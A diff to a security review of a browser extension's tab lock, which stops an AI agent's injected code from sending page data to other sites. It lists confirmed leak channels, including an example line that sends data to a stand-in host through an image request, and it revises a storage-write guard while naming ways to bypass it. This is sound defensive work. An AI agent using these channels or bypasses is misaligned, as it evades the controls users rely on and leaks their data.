@@ -11,7 +11,7 @@ post, send or save as the user, or carry what the page shows to another site, un
 |---|---|---|---|
 | TL-1 | high | **confirmed** in Chrome and Firefox; **fixed** | Cross-site images, scripts, styles, fonts and media are allowed on purpose, so `new Image().src = 'https://other.example/?d=' + data` carries data to any site |
 | TL-2 | high | **confirmed** in both (service worker posted and reached another site; blob: SharedWorker reached another site); **fixed** | Requests no tab owns (tabId −1) aren't covered: a SharedWorker made from a `blob:` URL, or the site's own service worker passing a fetch through, can post and send freely |
-| TL-3 | high | **confirmed** in both (Cache Storage, a service worker and localStorage survived the unlocking reload); **fixed** (check, then clear or ask) | What the code leaves in the site's storage (Cache Storage behind a cache-first service worker, localStorage/IndexedDB values the site renders, cookies) is still there after the reload that unlocks, so code can come back unlocked |
+| TL-3 | high | **confirmed** in both (Cache Storage, a service worker and localStorage survived the unlocking reload); **slowed and checked**: the agent's code can't save (a speed bump), caches and service workers that changed are cleared, other changes get a note | What the code leaves in the site's storage (Cache Storage behind a cache-first service worker, localStorage/IndexedDB values the site renders, cookies) is still there after the reload that unlocks, so code can come back unlocked |
 | TL-4 | medium | **confirmed** in both (another tab of the site posted; no icon, no notice); **fixed** | Other tabs of the same site aren't locked: BroadcastChannel, storage events and SharedWorkers reach them, and the site's own code there may act on what it receives |
 | TL-5 | medium | **confirmed in Chrome** (both popups reached another site; a `noopener` popup had no `openerTabId`); not seen in Firefox (its popups had the opener's id and no request got out); **fixed** | Popups: the new tab is locked only after `tabs.onCreated` (a race with its first request), and a `noopener` popup may have no `openerTabId`, so it isn't locked at all; data can ride in its URL |
 | TL-6 | low/medium | **confirmed** (Chrome: WebRTC sent STUN, also from a fresh iframe; preconnect connected three ways. Firefox: preconnect connected; WebRTC sent nothing to the test's STUN port); **speed bump** in the page, documented | DNS prefetch and preconnect (`<link rel=dns-prefetch href=//data.example>`), and WebRTC (STUN/TURN and data channels), aren't HTTP requests, so declarativeNetRequest never sees them |
@@ -68,14 +68,24 @@ cross-site URLs), so that channel wasn't confirmed; the guard covers it anyway.
     for it in an update). It isn't needed for the gap: the popup's first request is blocked by the
     initiator rule before any listener could run, and a popup to the site itself is locked as a tab of
     the site.
-- **TL-3:** a fingerprint at lock time, compared on the new page before unlocking. Cache Storage or
-  service workers changed: cleared from the isolated world for the site's origin (no `browsingData`
-  permission: TRIF doesn't have it; Chrome shows no warning for it, Firefox would ask in an update),
-  then a reload past the cache. localStorage, sessionStorage, IndexedDB or cookies changed: still
-  locked, and the panel asks to reset the site's saved data or keep it. Costs: a site that writes its
-  own storage during the lock (most big ones) asks after every lock; reset clears cookies the page can
-  see, which may sign the user out. Not covered: IndexedDB contents (names and versions only), HttpOnly
-  cookies (page code can't set those either).
+- **TL-3:** (first built as check-then-ask, with Reset and Keep in the panel; Tim dropped that, as big
+  sites write their own storage during nearly every lock.)
+  - The agent's saves are refused in the page (`leakGuard`): localStorage and sessionStorage (methods,
+    and named properties through a stand-in object), IndexedDB (open, delete, object-store and cursor
+    writes), `document.cookie`, `cookieStore`, Cache Storage and `serviceWorker.register`, when the call
+    stack holds the agent's run code (its `sourceURL`, `trif-run-<runId>.js`, given only to side-panel
+    runs). The error reaches the agent: "TRIF: your agent's code can't save data on this site". The
+    stack is read with V8's `stackTraceLimit` and `prepareStackTrace` set aside, so page code can't cut it
+    short. Bypasses: a wrapped function handed to the browser to call later (`queueMicrotask(
+    localStorage.setItem.bind(localStorage, k, v))`) runs with no agent frame; a realm the guard misses
+    has the originals; a terminal's `trif run` isn't tagged (the user's own agent).
+  - A fingerprint at lock time, compared on the new page before unlocking. Cache Storage or service
+    workers changed: cleared from the isolated world for the site's origin (no `browsingData`
+    permission: TRIF doesn't have it; Chrome shows no warning for it, Firefox would ask in an update),
+    then a reload past the cache. localStorage, sessionStorage, IndexedDB or cookies changed: unlocked as
+    usual, with one quiet line in the chat. Cost: a site whose service worker updates its caches during
+    the lock gets them cleared (it downloads them again). Not covered: IndexedDB contents (names and
+    versions only), HttpOnly cookies (page code can't set those either).
 - **TL-6 (speed bump, no new permission):** before the agent's code, `leakGuard` runs in the page's world:
   WebRTC's constructors throw; `<link rel=dns-prefetch|preconnect|prefetch|prerender|modulepreload>`
   can't be set by `rel` or `setAttribute`, and a MutationObserver removes any that appear; a
